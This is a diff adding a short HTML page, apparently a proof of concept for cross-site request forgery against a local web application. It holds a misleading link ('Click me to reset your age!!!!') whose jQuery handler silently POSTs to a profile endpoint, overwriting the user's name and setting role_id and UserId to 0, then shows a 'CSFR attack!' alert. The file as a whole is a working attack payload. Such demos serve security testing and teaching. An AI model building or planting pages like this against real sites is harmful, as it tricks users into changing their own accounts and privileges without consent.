@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="jquery-1.11.1.min.js"></script>
+</head>
+<body>
+<a href="#test" id="CSFR">Click me to reset your age!!!!</a>
+
+<script type="text/javascript">
+    $("#CSFR").click(function () {
+        $.ajax({
+            url: 'http://localhost/D/Profile',
+        data: { first_name: "Shame on", last_name: "you!", role_id: 0, UserId: 0 },
+		method: 'POST',
+            success: function (data) {
+                alert('CSFR attack!');
+            },
+            error: function (e) {
+                console.log(e);
+            }
+        });
+    });
+</script>
+<body>
+</html>
